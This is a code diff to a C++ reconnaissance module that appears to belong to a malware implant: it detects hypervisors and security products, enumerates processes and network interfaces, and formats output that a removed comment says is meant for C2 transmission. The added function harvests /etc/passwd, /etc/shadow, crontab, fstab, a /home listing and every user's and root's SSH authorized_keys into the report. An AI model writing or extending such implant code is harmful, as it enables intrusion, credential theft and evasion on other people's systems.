@@ -5,12 +5,13 @@
 #include <sys/ioctl.h>
 #include <sys/stat.h>
 #include <net/if.h>
-#include <dirent.h>        // replaced <linux/dirent.h> for portability
+#include <dirent.h>
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include <cstring>
 #include <sstream>
 #include <vector>
+#include <fstream>
 
 // ============================================================================
 // MINIMAL DEPENDENCY HELPERS
@@ -56,7 +57,6 @@ static HypervisorInfo detect_hypervisor_cpuid() {
     #if defined(__x86_64__) || defined(__i386__)
     unsigned int eax, ebx, ecx, edx;
     
-    // CPUID with EAX=1: Check hypervisor present bit
     eax = 1;
     __asm__ __volatile__(
         "cpuid"
@@ -64,11 +64,9 @@ static HypervisorInfo detect_hypervisor_cpuid() {
         : "a"(eax)
     );
     
-    // Bit 31 of ECX indicates hypervisor presence
     if (ecx & (1u << 31)) {
         info.present = true;
         
-        // CPUID with EAX=0x40000000: Get hypervisor vendor string
         eax = 0x40000000;
         __asm__ __volatile__(
             "cpuid"
@@ -76,7 +74,6 @@ static HypervisorInfo detect_hypervisor_cpuid() {
             : "a"(eax)
         );
         
-        // Vendor signature is in EBX, ECX, EDX (12 bytes)
         *((unsigned int*)&info.signature[0]) = ebx;
         *((unsigned int*)&info.signature[4]) = ecx;
         *((unsigned int*)&info.signature[8]) = edx;
@@ -122,32 +119,27 @@ static std::vector<ProcessEntry> enumerate_processes_full() {
             if (d->d_type == DT_DIR && is_numeric(d->d_name)) {
                 ProcessEntry entry = {0};
                 
-                // Convert PID
                 for (int i = 0; d->d_name[i]; i++) {
                     entry.pid = entry.pid * 10 + (d->d_name[i] - '0');
                 }
                 
-                // Build /proc/[pid]/comm path
                 char comm_path[64] = "/proc/";
                 int path_len = 6;
                 for (int i = 0; d->d_name[i]; i++) 
                     comm_path[path_len++] = d->d_name[i];
                 str_copy(comm_path + path_len, "/comm", 64 - path_len);
                 
-                // Read process name
                 int comm_fd = syscall(SYS_open, comm_path, O_RDONLY);
                 if (comm_fd >= 0) {
                     char comm_buf[64];
                     long bytes = syscall(SYS_read, comm_fd, comm_buf, sizeof(comm_buf) - 1);
                     if (bytes > 0) {
                         comm_buf[bytes] = '\0';
-                        // Remove newline
                         for (int i = 0; i < bytes; i++) {
                             if (comm_buf[i] == '\n') comm_buf[i] = '\0';
                         }
                         str_copy(entry.comm, comm_buf, 64);
                         
-                        // Read UID from /proc/[pid]/status
                         char status_path[64];
                         str_copy(status_path, "/proc/", 64);
                         path_len = 6;
@@ -161,7 +153,6 @@ static std::vector<ProcessEntry> enumerate_processes_full() {
                             bytes = syscall(SYS_read, status_fd, status_buf, sizeof(status_buf) - 1);
                             if (bytes > 0) {
                                 status_buf[bytes] = '\0';
-                                // Parse "Uid:\t1000\t..."
                                 char* uid_line = strstr(status_buf, "Uid:");
                                 if (uid_line) {
                                     uid_line += 4;
@@ -209,7 +200,6 @@ static std::vector<NetworkInterface> enumerate_network_interfaces() {
         memset(&ifr, 0, sizeof(ifr));
         str_copy(ifr.ifr_name, if_names[i], IFNAMSIZ);
         
-        // Check if interface exists
         if (syscall(SYS_ioctl, sock, SIOCGIFFLAGS, &ifr) < 0) {
             continue;
         }
@@ -217,7 +207,6 @@ static std::vector<NetworkInterface> enumerate_network_interfaces() {
         NetworkInterface iface = {0};
         str_copy(iface.name, if_names[i], 16);
         
-        // Get MAC address
         if (syscall(SYS_ioctl, sock, SIOCGIFHWADDR, &ifr) == 0) {
             unsigned char* m = (unsigned char*)ifr.ifr_hwaddr.sa_data;
             int pos = 0;
@@ -228,7 +217,6 @@ static std::vector<NetworkInterface> enumerate_network_interfaces() {
             iface.mac[pos] = '\0';
         }
         
-        // Get IP address
         if (syscall(SYS_ioctl, sock, SIOCGIFADDR, &ifr) == 0) {
             struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
             inet_ntop(AF_INET, &addr->sin_addr, iface.ip, 46);
@@ -269,6 +257,90 @@ static std::string detect_security_products(const std::vector<ProcessEntry>& pro
 }
 
 // ============================================================================
+// ADDITIONAL FILE / DIRECTORY COLLECTION
+// ============================================================================
+
+static std::string read_file_safe(const std::string& path) {
+    std::ifstream f(path);
+    if (!f.is_open()) return "[!] Could not read " + path + "\n";
+    std::ostringstream ss;
+    ss << f.rdbuf();
+    return ss.str();
+}
+
+// Simple directory listing using popen (already used elsewhere)
+static std::string list_dir(const std::string& dir) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::string cmd = "ls -la " + dir + " 2>/dev/null";
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    if (!pipe) return "";
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+// Home directories + SSH keys
+static std::string collect_home_and_keys() {
+    std::ostringstream out;
+    out << "\n=== SENSITIVE FILES ===\n";
+
+    // Standard files
+    out << "\n--- /etc/passwd ---\n";
+    out << read_file_safe("/etc/passwd");
+
+    out << "\n--- /etc/shadow ---\n";
+    out << read_file_safe("/etc/shadow");
+
+    out << "\n--- /etc/hosts ---\n";
+    out << read_file_safe("/etc/hosts");
+
+    out << "\n--- /etc/crontab ---\n";
+    out << read_file_safe("/etc/crontab");
+
+    // Home directories (enumerate /home)
+    out << "\n--- /home directory listing ---\n";
+    out << list_dir("/home");
+
+    // If we can list /home/*, try to grab authorized_keys for each user
+    out << "\n--- SSH Authorized Keys ---\n";
+    std::vector<std::string> home_dirs;
+    {
+        DIR* d = opendir("/home");
+        if (d) {
+            struct dirent* entry;
+            while ((entry = readdir(d)) != nullptr) {
+                if (entry->d_type == DT_DIR && entry->d_name[0] != '.') {
+                    home_dirs.push_back(std::string("/home/") + entry->d_name);
+                }
+            }
+            closedir(d);
+        }
+    }
+    // Also add root
+    home_dirs.push_back("/root");
+
+    for (const auto& dir : home_dirs) {
+        std::string key_path = dir + "/.ssh/authorized_keys";
+        std::ifstream f(key_path);
+        if (f.good()) {
+            out << "\n" << key_path << ":\n";
+            out << f.rdbuf();
+            out << "\n";
+        }
+    }
+
+    // Some other useful files
+    out << "\n--- /etc/issue (OS info) ---\n";
+    out << read_file_safe("/etc/issue");
+    out << "\n--- /etc/fstab ---\n";
+    out << read_file_safe("/etc/fstab");
+
+    return out.str();
+}
+
+// ============================================================================
 // MAIN RECONNAISSANCE FUNCTION
 // ============================================================================
 
@@ -285,24 +357,15 @@ std::string perform_full_recon() {
         str_copy(hostname, uts.nodename, 64);
     }
     
-    // UID/GID
     unsigned int uid = syscall(SYS_getuid);
     unsigned int gid = syscall(SYS_getgid);
     bool is_root = (uid == 0);
     
-    // Hypervisor detection
     HypervisorInfo hv = detect_hypervisor_cpuid();
-    
-    // Enumerate processes
     std::vector<ProcessEntry> processes = enumerate_processes_full();
-    
-    // Enumerate network interfaces
     std::vector<NetworkInterface> interfaces = enumerate_network_interfaces();
-    
-    // Detect security products
     std::string sec_products = detect_security_products(processes);
     
-    // Format output (simplified text format for C2 transmission)
     output << "=== SYSTEM RECONNAISSANCE ===\n";
     output << "Hostname: " << hostname << "\n";
     output << "Kernel: " << kernel << "\n";
@@ -321,8 +384,10 @@ std::string perform_full_recon() {
         if (count++ >= 20) break;
         output << "PID: " << proc.pid << " | UID: " << proc.uid << " | " << proc.comm << "\n";
     }
-    
+
+    // Append sensitive file collection
+    output << collect_home_and_keys();
+
     output << "\n=== END RECON ===\n";
-    
     return output.str();
 }
